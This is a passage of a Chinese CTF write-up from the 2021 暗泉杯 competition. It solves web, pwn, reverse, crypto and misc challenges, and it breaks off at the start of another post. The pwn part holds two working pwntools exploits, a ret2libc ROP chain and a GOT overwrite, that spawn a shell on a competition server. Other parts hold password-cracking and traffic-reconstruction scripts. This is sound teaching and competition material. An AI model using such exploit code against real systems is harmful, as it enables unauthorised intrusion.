io是基于事件触发的，有点类似于智能合约，请求与响应没有严格的对应关系，只能把请求和响应封装成一个原子操作，模拟传统的HTTP请求，代价就是速度很慢很慢。sql注入部分就是常见的sqlite注入了，但是爆flag的时候不知道为什么有的位即使把0-255跑遍也跑不出来，猜测可能是使用了中文，一个字符不只一个字节，这种情况下的爆破时间过长，所以在脚本中如果常用字符找不到就用\\0占位，缺失的字符按照uuid的格式猜就行了。\nflag{34e7472f-ffcf-400d-aec3-a3b4fe390c1d} Pwn [签到]NssShop 随便输了个数\n\r\njustdoit 有一个汇编在调用read_long函数的最后，配合上atol可以任意往上往下更改栈的位置，利用这一点在栈上构造rop用ret2libc拿shell\nadd rbp rax 以下是exp\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = process(\u0026#34;./justdoit.1\u0026#34;) p = remote(\u0026#34;47.106.172.144\u0026#34;, 65004) elf = ELF(\u0026#34;./justdoit.1\u0026#34;) libc = ELF(\u0026#34;./libc-2.23.so\u0026#34;) pop_rdi = 0x00000000004012b3 main = 0x4011D5 p.recvuntil(\u0026#34;name?\u0026#34;) p.send(p64(main)+ p64(main) + p64(main)) p.recvuntil(\u0026#34;s??\u0026#34;) p.sendline(b\u0026#34;-24\u0026#34;) p.recvuntil(\u0026#34;name?\u0026#34;) p.send(p64(pop_rdi) + p64(elf.got[\u0026#34;puts\u0026#34;]) + p64(elf.plt[\u0026#34;puts\u0026#34;])) p.recvuntil(\u0026#34;s??\u0026#34;) p.sendline(b\u0026#34;-40\u0026#34;) libc.address = u64(p.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.sym[\u0026#34;puts\u0026#34;] print(hex(libc.address)) p.recvuntil(\u0026#34;name?\u0026#34;) p.send(p64(pop_rdi) + p64(libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__()) + p64(libc.sym[\u0026#39;system\u0026#39;])) p.recvuntil(\u0026#34;s??\u0026#34;) p.sendline(b\u0026#34;-40\u0026#34;) p.interactive() \r\nreallNeedGoodLuck 任意地址四字节写， 改error的got表为main，改atoi的got表为system，撞上的几率很大，直接手动爆破就行\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) libc = ELF(\u0026#34;./libc-2.23.so\u0026#34;) p=remote(\u0026#34;47.106.172.144\u0026#34;, 65003) # p = process(\u0026#34;./reallNeedGoodLuck.1\u0026#34;) # gdb.attach(p) p.recvuntil(\u0026#34;good\u0026#34;) p.send(b\u0026#34;\\xa9\\x11\\x40\\x00\u0026#34;) p.recvuntil(\u0026#34;luck!\u0026#34;) p.sendline(b\u0026#34;4210744\u0026#34;) p.recvuntil(\u0026#34;good\u0026#34;) p.send(b\u0026#34;\\x00\\x00\\xa0\\xf3\u0026#34;) p.recvuntil(\u0026#34;luck!\u0026#34;) p.sendline(b\u0026#34;4210734\u0026#34;) print(hex(libc.sym[\u0026#34;system\u0026#34;])) p.send(b\u0026#34;\\x00\\x00\\x00\\x00\u0026#34;) p.sendline(b\u0026#34;/bin/sh\\x00\u0026#34;) p.send(b\u0026#34;\\x00\\x00\\x00\\x00\u0026#34;) p.sendline(b\u0026#34;/bin/sh\\x00\u0026#34;) p.interactive() \r\nReverse [签到]Signin \r\n[萌新]happyCTF s = \u0026#39;rxusoCqxw{yqK`{KZqag{r`i\u0026#39; for i in s: print(chr(ord(i)^0x14),end=\u0026#39;\u0026#39;) #flag{Welcome_to_Neusoft} Remember Crypt 4 rc4加密，根据密钥解密即可\ndef __rc4_init(key): keylength = len(key) S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % keylength]) % 256 S[i], S[j] = S[j], S[i] return S def rc4_crypt(key, data): S = __rc4_init(key) i = j = 0 result = b\u0026#39;\u0026#39; for a in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = (a ^ S[(S[i] + S[j]) % 256]).to_bytes(1, \u0026#39;big\u0026#39;) result += k return result l = [0x9E, 0xE7, 0x30, 0x5F, 0xA7, 0x01, 0xA6, 0x53, 0x59, 0x1B, 0x0A, 0x20, 0xF1, 0x73, 0xD1, 0x0E, 0xAB, 0x09, 0x84, 0x0E, 0x8D, 0x2B] n = [] for i in l: n.append(i^0x22) from libnum import n2s, s2n def convert(k): ret = [] while k \u0026gt; 0: ret.append(k \u0026amp; 0xff) k \u0026gt;\u0026gt;= 8 return ret[::-1] print(rc4_crypt(convert(s2n(\u0026#39;12345678abcdefghijklmnopqrspxyz\u0026#39;)),n)) #flag{nice_to_meet_you} EasyRe 用信号量实现的VM，先手动反汇编\ncode = [ 17, 52, 0, 42, 5, 16, 20, 9, 23, 0, 36, 5, 3, 17, 29, 6, 0, 0, 5, 3, 17, 64, 6, 0, 72, 5, 17, 29, 23, 14, 1, 21, 4, 15, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 50, 5, 9, 2, 19, 29, 5, 18, 21, 4, 16, 20, 61, 10, 1, 19, 52, 3, 4, 18, 14, 1, 21, 4, 7, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 85, 5, 9, 1, 19, 64, 5, 18 ] sub_400E1D = \u0026#34;push({});\u0026#34; sub_400E78 = \u0026#34;pop({});\u0026#34; sub_400F16 = \u0026#34;{}+= {};\u0026#34; sub_400FA8 = \u0026#34;{}-= {};\u0026#34; eip = 0 # 20 eax = 0 # 16 ebx = 0 # 17 ecx = 0 # 18 edx = 0 # 19 memory = [2] * 0x1000 memory2 = [1] * 50 while eip \u0026lt; len(code): cur_op = code[eip] if cur_op == 0: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = cur_arg eip += 1 elif cur_op == 1: cur_arg = \u0026#34;eax\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = eax elif cur_op == 2: cur_arg = \u0026#34;ebx\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = ebx elif cur_op == 3: cur_arg = \u0026#34;ecx\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = ecx elif cur_op == 4: cur_arg = \u0026#34;eax\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) eax = memory[edx] elif cur_op == 5: cur_arg = \u0026#34;ebx\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) ebx = memory[edx] elif cur_op == 6: cur_arg = \u0026#34;ecx\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) ecx = memory[edx] elif cur_op == 7: eax += ebx print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;eax += ebx;\u0026#34;) elif cur_op == 8: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;eax\u0026#34;, cur_arg)) eax += cur_arg eip += 1 elif cur_op == 9: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;ebx\u0026#34;, cur_arg)) ebx += cur_arg eip += 1 elif cur_op == 10: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;ecx\u0026#34;, cur_arg)) ecx += cur_arg eip += 1 elif cur_op == 11: eax -= ebx print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;eax -= ebx;\u0026#34;) elif cur_op == 12: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;eax\u0026#34;, cur_arg)) eax -= cur_arg eip += 1 elif cur_op == 13: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;ebx\u0026#34;, cur_arg)) ebx -= cur_arg eip += 1 elif cur_op == 14: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;ecx\u0026#34;, cur_arg)) eip += 1 elif cur_op == 15: eax ^= ebx print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;eax ^= ebx;\u0026#34;) elif cur_op == 16: zf = (eax == ebx) print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;zf = (eax == ebx);\u0026#34;) elif cur_op == 17: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;push(eip+2); eip = {hex(cur_arg)};\u0026#34;) memory[edx] = eip edx += 1 eip += 1 elif cur_op == 18: edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;pop(eip);\u0026#34;) elif cur_op == 19: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;eip = {hex(cur_arg)};\u0026#34;) eip += 1 elif cur_op == 20: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;if zf: eip = {hex(cur_arg)};\u0026#34;) eip += 1 elif cur_op == 21: memory[edx] = memory2[ecx] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;push(memory2[ecx]);\u0026#34;) edx += 1 elif cur_op == 22: edx -= 1 memory2[ecx] = memory[edx] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;pop(memory2[ecx]);\u0026#34;) elif cur_op == 23: print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;break;\u0026#34;) eip += 1 拿到反汇编结果\n_00: push(eip+2); eip = 0x34; _02: push(42); _04: pop(ebx); _05: zf = (eax == ebx); _06: if zf: eip = 0x9; _08: break; _09: push(36); _0B: pop(ebx); _0C: push(ecx); _0D: push(eip+2); eip = 0x1d; _0F: pop(ecx); _10: push(0); _12: pop(ebx); _13: push(ecx); _14: push(eip+2); eip = 0x40; _16: pop(ecx); _17: push(72); _19: pop(ebx); _1A: push(eip+2); eip = 0x1d; _1C: break; _1D: ecx -= 1; _1F: push(memory2[ecx]); _20: pop(eax); _21: eax ^= ebx; _22: push(eax); _23: pop(memory2[ecx]); _24: push(ebx); _25: push(0); _27: pop(eax); _28: push(ecx); _29: pop(ebx); _2A: zf = (eax == ebx); _2B: if zf: eip = 0x32; _2D: pop(ebx); _2E: ebx += 2; _30: eip = 0x1d; _32: pop(ebx); _33: pop(eip); _34: push(memory2[ecx]); _35: pop(eax); _36: zf = (eax == ebx); _37: if zf: eip = 0x3d; _39: ecx += 1; _3B: eip = 0x34; _3D: push(ecx); _3E: pop(eax); _3F: pop(eip); _40: ecx -= 1; _42: push(memory2[ecx]); _43: pop(eax); _44: eax += ebx; _45: push(eax); _46: pop(memory2[ecx]); _47: push(ebx); _48: push(0); _4A: pop(eax); _4B: push(ecx); _4C: pop(ebx); _4D: zf = (eax == ebx); _4E: if zf: eip = 0x55; _50: pop(ebx); _51: ebx += 1; _53: eip = 0x40; _55: pop(ebx); _56: pop(eip); 发现其实是调用了几个函数，分别在0x34、0x40、0x1D\n0x34处的函数判断了长度，0x1D处的函数从后往前异或数字，每次加2，0x40处的函数从后往前进行加法，数字每次加1\n所以最后的加密算法为：首先从后往前 ^36, ^38, ^40，随后从后往前+0, +1, +2\u0026hellip;，最后从后往前 ^72, ^74, ^76\u0026hellip;\n反向解密即可\ns2 = [ 0xA3, 0xD8, 0xAC, 0xA9, 0xA8, 0xD6, 0xA6, 0xCD, 0xD0, 0xD5, 0xF7, 0xB7, 0x9C, 0xB3, 0x31, 0x2D, 0x40, 0x5B, 0x4B, 0x3A, 0xFD, 0x57, 0x42, 0x5F, 0x58, 0x52, 0x54, 0x1B, 0x0C, 0x78, 0x39, 0x2D, 0xD9, 0x3D, 0x35, 0x1F, 0x09, 0x41, 0x40, 0x47, 0x42, 0x11 ] flag = \u0026#39;\u0026#39; x = 36 y = 0 z = 72 for i in s2[::-1]: flag += chr(((i ^ z) - y) ^ x) x += 2 y += 1 z += 2 print (flag[::-1]) # \u0026#39;flag{Now_Y0u_Know_th4_Signa1_0f_Linux!!!!}\u0026#39; Crypto [萌新]素数 使用gmpy2生成10个大素数，然后依次提交即可\n[签到]键盘侠 根据题目名称，猜测和键盘有关系\n将密文放入键盘的对应位置后，发现一组密文在键盘上构成一个图案，这个图案是一个字母\n比如UYTGBNM在键盘上组成一个C，同样的方式和可以还原出其他字母\nsilent_peeper 离散对数，考虑幂只有40bit，用BSGS即可解出答案。\nsage: p = 17480715736546509273132356167852223654917350291331787539356496312333028105252468745075491024000992015452563532 ....: 520952698743383378549938420481917954954410649849158983419586000890687503941868419125253760412312965974672161440234 ....: 6449135195832955793815709136053198207712511838753919608894095907732099313139446299843 ....: g = 41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307 ....: 185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366 ....: 973332463469104730271236078593527144954324116802080620822212777139186990364810367977 ....: sage: bsgs(mod(g,p),mod(A,p),(0,1\u0026lt;\u0026lt;40)) 822690494337 sage: bsgs(mod(g,p),mod(B,p),(0,1\u0026lt;\u0026lt;40)) 621209248538 sage: key = pow(A, 621209248538 ,p) sage: key 49490143664250726340234715933627573928019204778410313862054713655398194526581099674219755475997125892095025977920719640048704962181220475413665581922989858463397985369540020911109237604500080688916224884254427061443849735076051958183562833019840975221087968773423237208708556105725003184929141476854095400756 \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import * \u0026gt;\u0026gt;\u0026gt; from Crypto.Cipher import AES \u0026gt;\u0026gt;\u0026gt; ciphertext = 0xed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c \u0026gt;\u0026gt;\u0026gt; key = 49490143664250726340234715933627573928019204778410313862054713655398194526581099674219755475997125892095025977920719640048704962181220475413665581922989858463397985369540020911109237604500080688916224884254427061443849735076051958183562833019840975221087968773423237208708556105725003184929141476854095400756 \u0026gt;\u0026gt;\u0026gt; key = long_to_bytes(key)[:16] \u0026gt;\u0026gt;\u0026gt; cipher = AES.new(key, AES.MODE_ECB) \u0026gt;\u0026gt;\u0026gt; cipher.decrypt(int.to_bytes(ciphertext, ciphertext.bit_length()//8, \u0026#39;big\u0026#39;)) b\u0026#39;flag{21384433-0dc7-413b-9d09-64cc97c99730}\\x06\\x06\\x06\\x06\\x06\\x06\u0026#39; EzDES 题目是个DES一轮差分，有数学公式: $ L_1=R_0,R_1=L_0\\oplus f(R_0,K_0) $，其中L1R1,L0R0都是已知量，只需要逆推到s盒附近，通过s盒的结果爆破s盒的输入即可，有65536种可能，然后用剩下几个明密文对验证，排除出剩一种结果。主要代码如下(请将S盒，IP盒等内容分别命名为IP_1.txt，sbox.txt等放入文件src子目录下，详情见代码)\n######################################################################### # Get roundKey ######################################################################### # get the move number def getMoveNum(): res = [0] * 16 for i in range(16): if i == 0 or i == 1 or i == 8 or i == 15: res[i] = 1 else: res[i] = 2 return res # get the PC_1 table and PC_2 table def getPC(): PC_1_str = open(\u0026#39;./src/PC_1.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() PC_2_str = open(\u0026#39;./src/PC_2.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() PC_1 = [0] * len(PC_1_str) PC_2 = [0] * len(PC_2_str) for i in range(len(PC_1_str)): PC_1[i] = int(PC_1_str[i]) for i in range(len(PC_2_str)): PC_2[i] = int(PC_2_str[i]) return PC_1, PC_2 # cyclic shift to the left def leftRow(arr, n): temp = [0] * n length = len(arr) for i in range(n): temp[i] = arr[i] for i in range(length): if i \u0026lt; length - n: arr[i] = arr[i + n] else: arr[i] = temp[i - length + n] return arr # get the k0 - k16 def genKey(key): C = [0] * 28 D = [0] * 28 K = [0] * 56 roundKey = [[0]*48 for i in range(16)] PC_1, PC_2 = getPC() moveNum = getMoveNum() # get K+ for i in range(56): K[i] = key[PC_1[i] - 1] # get C0 and D0 for i in range(28): C[i] = K[i] D[i] = K[i + 28] # get roundKey for i in range(16): C = leftRow(C, moveNum[i]) D = leftRow(D, moveNum[i]) for j in range(48): if PC_2[j] \u0026lt;= 28: roundKey[i][j] = C[PC_2[j] - 1] else: roundKey[i][j] = D[PC_2[j] - 28 -1] return roundKey ######################################################################### # Encrypt and Decrypt ######################################################################### #get the IP and PC_1 table def getIP(): IP_str = open(\u0026#39;./src/IP.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() IP_1_str = open(\u0026#39;./src/IP_1.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() IP = [0] * len(IP_str) IP_1 = [0] * len(IP_1_str) for i in range(len(IP_str)): IP[i] = int(IP_str[i]) for i in range(len(IP_1_str)): IP_1[i] = int(IP_1_str[i]) return IP, IP_1 # l1 xor l2 def xor(l1, l2): res = [0] * len(l1) for i in range(len(l1)): res[i] = l1[i] ^ l2[i] return res # get the Extend table def getE(): E_str = open(\u0026#39;./src/extend.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() E = [0] * len(E_str) for i in range(len(E_str)): E[i] = int(E_str[i]) return E # extend R from 32 bit to 48 bit def extend(R): res = [0] * 48 E = getE() for i in range(48): res[i] = R[E[i] - 1] return res # get sbox in 3 dim def getSbox(): S_str = open(\u0026#39;./src/sbox.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() S = [[[0]*16 for i in range(4)]for i in range(8)] l = 0 for i in range(8): for j in range(4): for k in range(16): S[i][j][k] = int(S_str[l]) l += 1 return S # number in dec to number in bit def d2b(n): res = \u0026#39;\u0026#39; while n \u0026gt; 0: res += chr(n % 2 + ord(\u0026#39;0\u0026#39;)) n = n // 2 while len(res) \u0026lt; 4: res += \u0026#39;0\u0026#39; return res[::-1] # sbox replacement def sbox(ipt): S = getSbox() res = [0] * 32 i, l = 0, 0 while i \u0026lt; 48: j = ipt[i] * 2 + ipt[i + 5] k = ipt[i + 1] * 8 + ipt[i + 2] * 4 + ipt[i + 3] * 2 + ipt[i + 4] temp = d2b(S[l][j][k]) for m in range(4): res[m + l * 4] = int(temp[m]) l += 1 i += 6 return res # get Pbox def getPbox(): P_str = open(\u0026#39;./src/pbox.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() P = [0] * len(P_str) for i in range(len(P_str)): P[i] = int(P_str[i]) return P # pbox replacement def pbox(ipt): P = getPbox() res = [0] * 32 for i in range(32): res[i] = ipt[P[i] - 1] return res # f function def f(R, K): # extend R E_R = extend(R) # E_R xor K afterADD = xor(E_R, K) # sbox afterSbox = sbox(afterADD) # linear displacement res = pbox(afterSbox) return res # Encrypt function def DES_Encrypt(plaintext, roundkey): M_IP = [0] * 64 cipher = [0] * 64 afterF = [0] * 64 L = [[0] * 32 for i in range(17)] R = [[0] * 32 for i in range(17)] IP, IP_1 = getIP() # get IP replace for i in range(64): M_IP[i] = plaintext[IP[i] - 1] # get L0 and R0 for i in range(32): L[0][i] = M_IP[i] R[0][i] = M_IP[i + 32] for i in range(1,17): # L[i] = R[i - 1] for j in range(32): L[i][j] = R[i - 1][j] R[i] = xor(L[i - 1], f(R[i - 1], roundkey[i - 1])) # merge the R and L for i in range(64): if i \u0026lt; 32: afterF[i] = R[16][i] else: afterF[i] = L[16][i - 32] # using IP_1 replace to get cipher for i in range(64): cipher[i] = afterF[IP_1[i] - 1] return cipher ######################################################################### # Main ######################################################################### # number in hex to number in bin def hex_to_bin(a): b = int(a, 16) res = \u0026#39;\u0026#39; while b \u0026gt; 0: res += chr(b % 2 + ord(\u0026#39;0\u0026#39;)) b = b // 2 while len(res) \u0026lt; 4: res += \u0026#39;0\u0026#39; return res[::-1] # text in hex to text in bin def h2b(s): res = [] for i in s: temp = hex_to_bin(i) for j in range(4): res.append(int(temp[j])) return res # number in bin to number in hex def bin_to_hex(a): b = int(a, 2) return hex(b)[2:] # text in bin to text in hex def b2h(s): res = \u0026#39;\u0026#39; now_bin = \u0026#39;\u0026#39; for i in range(len(s)): now_bin += chr(s[i] + ord(\u0026#39;0\u0026#39;)) if len(now_bin) % 4 == 0: res += bin_to_hex(now_bin) now_bin = \u0026#39;\u0026#39; return res def gen_P_1(): p = getPbox() p_1 = [0] * 32; for i in range(32): p_1[p[i] - 1] = i return p_1 def str2martix(s): m = [0] * 6 for i in range(6): m[i] = int(s[i], 2) return m def solve(plaintext, cipher): m = h2b(plaintext) c = h2b(cipher) C_IP = [0] * 64 M_IP = [0] * 64 cipher = [0] * 64 may_after_xor = [[\u0026#39;\u0026#39;for i in range(4)]for j in range(8)] L = [[0] * 32 for i in range(17)] R = [[0] * 32 for i in range(17)] ast = [0] * 32 IP, IP_1 = getIP() before_p = [0] * 32 S = getSbox() p_1 = gen_P_1() # get IP replace for i in range(64): M_IP[i] = m[IP[i] - 1] C_IP[i] = c[IP[i] - 1] # get L0 and R0 for i in range(32): L[0][i] = M_IP[i] R[0][i] = M_IP[i + 32] for i in range(32): L[1][i] = C_IP[i] R[1][i] = C_IP[i + 32] e = extend(R[0]) cip = xor(R[1], L[0]) for i in range(32): before_p[i] = cip[p_1[i]] # 还原进入sbox前的值 for i in range(8): for j in range(4): for k in range(16): if S[i][j][k] == int(b2h(before_p[i*4:(i+1)*4]), 16): may_after_xor[i][j] = (bin(j)[2:].zfill(2)[0] + bin(k)[2:].zfill(4) + bin(j)[2:].zfill(2)[1]) may_res = [[[]for i in range(4)]for j in range(8)] for i in range(8): for j in range(4): may_after_xor[i][j] = str2martix(may_after_xor[i][j]) # 还原所有可能的K for i in range(8): for j in range(4): may_res[i][j] = (xor(may_after_xor[i][j], e[i*6:(i+1)*6])) return may_res def gen_PC_1(): PC_1, PC_2 = getPC() PC1, PC2 = [-1] * 64, [-1] * 56 for i in range(56): PC1[PC_1[i] - 1] = i for i in range(48): PC2[PC_2[i] - 1] = i return PC1, PC2 # def resolve_key(roundKey): # C = [0] * 28 # D = [0] * 28 # K = [0] * 56 # PC_1, PC_2 = getPC() # PC1, PC2 = gen_PC_1() # moveNum = getMoveNum() # for i in range(48): # if PC2[j] \u0026lt;= 28: # C[PC2[j]] = roundKey[i] # else: # D[PC2[j] - 28] = roundKey[i] # C = leftRow(C, 28 - moveNum[i]) # D = leftRow(D, 28 - moveNum[i]) # for i in range(28): # K[i] = C[i] # K[i + 28] = D[i] # for i in range(56): # key[PC1[i]] = K[i] # return key if __name__ == \u0026#39;__main__\u0026#39;: plaintext1 = \u0026#34;4845AB454511C0F0\u0026#34; miwen1 = \u0026#34;2EA85F08AA80C2D2\u0026#34; plaintext2 = \u0026#34;0123456789ABCDEF\u0026#34; miwen2 = \u0026#34;0293A8B9E45FCE5D\u0026#34; plaintext3 = \u0026#34;81120015A001FDF1\u0026#34; miwen3 = \u0026#34;E88382207800FE7A\u0026#34; plaintext4 = \u0026#34;2214500AEF00CD48\u0026#34; miwen4=\u0026#34;B38AA0AD7720E4AC\u0026#34; plaintext5 = \u0026#34;5791AC22121B1234\u0026#34; miwen5=\u0026#34;A3C0DEB9AB0F833A\u0026#34; K1 = solve(plaintext1, miwen1) K2 = solve(plaintext2, miwen2) K3 = solve(plaintext3, miwen3) K4 = solve(plaintext4, miwen4) K5 = solve(plaintext5, miwen5) K = [] for i in range(8): for j in range(4): if (K1[i][j] in K2[i]) and (K1[i][j] in K3[i]) and (K1[i][j] in K4[i]) and (K1[i][j] in K5[i]): print(i, j) K += K1[i][j] print(K) Misc [萌新]在哪儿呢 PDF里面有很多不可见字符，直接复制粘贴到sublime里面就可以看到flag\nflag{hey_there_is_no_thing}\n[签到]签到 题目描述，直接提交\n只是个PNG，别想太多了.png 拿到png，利用pngdebugger查，发现后面的块恢复成IDAT就行\n\r\ncrc不对，爆破长宽，抄了个大师傅的脚本\nimport zlib import struct file = \u0026#39;PNG.png\u0026#39; fr = open(file,\u0026#39;rb\u0026#39;).read() data = bytearray(fr[12:29]) crc32key = eval(str(fr[29:33]).replace(\u0026#39;\\\\x\u0026#39;,\u0026#39;\u0026#39;).replace(\u0026#34;b\u0026#39;\u0026#34;,\u0026#39;0x\u0026#39;).replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\u0026#39;)) #crc32key = 0xCBD6DF8A  #data = bytearray(b\u0026#39;\\x49\\x48\\x44\\x52\\x00\\x00\\x01\\xF4\\x00\\x00\\x01\\xF1\\x08\\x06\\x00\\x00\\x00\u0026#39;)  n = 4095 for w in range(n): width = bytearray(struct.pack(\u0026#39;\u0026gt;i\u0026#39;, w)) for h in range(n): height = bytearray(struct.pack(\u0026#39;\u0026gt;i\u0026#39;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] #print(data) crc32result = zlib.crc32(data) if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(file+\u0026#39;.png\u0026#39;,\u0026#39;wb\u0026#39;) fw.write(newpic) fw.close # return None 恢复后图片新增内容\n\r\n看到多了一个压缩的部分，拿binwalk分了下，flag在后面的文件中\nflag{zhe_ti_mu_ye_tai_bt_le_XD}\n压缩包压缩包压缩包压缩包 import zipfile import os for i in range(0,1000): name = os.listdir(\u0026#34;./\u0026#34;)[0] zfile = zipfile.ZipFile(name,\u0026#39;r\u0026#39;) in_file = zfile.namelist()[0] passwd = in_file[0:-4] zfile.extract(in_file, \u0026#39;./\u0026#39;,bytes(passwd,encoding =\u0026#34;ascii\u0026#34;)) zfile.close() os.remove(name) 解出23333.zip\n密码根据规律猜测是3-6位，爆破得到756698是密码\n010editor搜索flag得到flag\nflag{Unz1p_i5_So_C00l##}\nrange_download 过滤dns报文，存在几条query name为xx.nss.neusoft.edu.cn的dns请求包，应该是base64编码的dns隧道，上脚本分析：\nimport pyshark import re import base64 cap = pyshark.FileCapture(\u0026#39;range.pcapng\u0026#39;,display_filter=\u0026#39;dns and dns.flags==0x00000100 and dns.qry.name matches \u0026#34;^[^.-]*\\.nss.neusoft.edu.cn$\u0026#34;\u0026#39;) datas = [] ids = [] for pkt in cap: name = pkt.dns.qry_name id = pkt.dns.id match = re.search(\u0026#39;^([^.-]*)\\.nss.neusoft.edu.cn$\u0026#39;, name) data = \u0026#39;\u0026#39; if match: data = match.group(1) if data == \u0026#39;\u0026#39;: print(\u0026#39;error! \u0026#39; + name) if id in ids: continue datas.append(data) ids.append(id) line = \u0026#39;\u0026#39;.join(datas) img = base64.b64decode(line.encode()) print(img) cap.close() 跑出来是password: nss_yyds!\n过滤http协议，全都是206 Partial Content，把flag.7z一个字节一个字节地传了过来，顺序是乱的，需要写脚本恢复。调试的时候发现基本每个字节都会被传输很多次，并且有一个字节没有被传输，这些在写脚本的时候都需要注意到。\nimport pyshark import re import base64 cap = pyshark.FileCapture(\u0026#39;range.pcapng\u0026#39;,display_filter=\u0026#39;http and http.response.code == 206\u0026#39;) data = bytearray(2460) poslist = [False for i in range(2460)] for pkt in cap: length = int(pkt.http.content_length) payload = pkt.http.file_data.binary_value for field in pkt.http.response_line.alternate_fields: if field.showname_key == \u0026#39;Content-Range\u0026#39;: pos_start = -1 pos_end = -1 contentRange = field.showname_value.strip(\u0026#39;\\\\r\\\\n\u0026#39;) match = re.search(\u0026#39;bytes (\\d+)-(\\d+)/\\d+\u0026#39;, contentRange) if match: pos_start = int(match.group(1)) pos_end = int(match.group(2)) assert(pos_end - pos_start + 1 == length) for i in range(pos_start, pos_end+1): if poslist[i] == True: assert(data[i] == payload[i-pos_start]) else: poslist[i] = True data[pos_start:pos_end+1] = payload else: print(\u0026#39;Error! Range not found!\u0026#39;) exit(0) break else: pass for i in range(2460): if poslist[i] == False: print(i) cap.close() with open(\u0026#39;flag.7z\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(data) 下标2349位置的字节未知，需要爆破一下：\nimport py7zr import os import _lzma with open(\u0026#39;flag.7z\u0026#39;,\u0026#39;rb\u0026#39;) as f: source = f.read() data = bytearray(source) for i in range(256): print(\u0026#34;Now: \u0026#34;+str(i)) data[2349] = i with open(\u0026#39;flag%d.7z\u0026#39;%(i),\u0026#39;wb\u0026#39;) as f1: f1.write(data) try: with py7zr.SevenZipFile(\u0026#39;flag%d.7z\u0026#39;%(i), \u0026#39;r\u0026#39;, password=\u0026#39;nss_yyds!\u0026#39;) as archive: if archive.test() == True or archive.test() == None: print(\u0026#39;Found:\u0026#39; + str(i)) break else: os.remove(\u0026#39;flag%d.7z\u0026#39;%(i)) except (py7zr.exceptions.Bad7zFile, _lzma.LZMAError) as e: print(e) os.remove(\u0026#39;flag%d.7z\u0026#39;%(i)) 运行结果是194，将flag194.7z解压得到flag.png\n\r\n解码为5133687161454e534e6b394d4d325a7854475233566e6870626a42554e6a5a4a5645466c4e47786a62324e464d47705557464635546d6c536148565165564659645563774e327073515863324f5846555247314555564134555570706344686957444d336544684c596c4255556e6333636e687165486c756446413351577470566e4242526b6c4a5457316c515452754d555661636e4a7859556430566c4d3559557844656a4a35626c68334d6d5a4c51513d3d\nciphey一把梭：\n\r\nflag{6095B134-5437-4B21-BE52-EDC46A276297}\n","date":"2021-12-06T19:23:41+08:00","image":"https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams_hu9bd851d71a6520395d404c81ac536fbe_87588_120x120_fill_box_smart1_3.png","permalink":"https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/","title":"2021暗泉杯 Writeup"},{"content":"Misc 溯源取证——张三的电脑 下载得到压缩包，经过判断类型后得知是 VMDK 文件，用 vmware 挂载。其中得到了 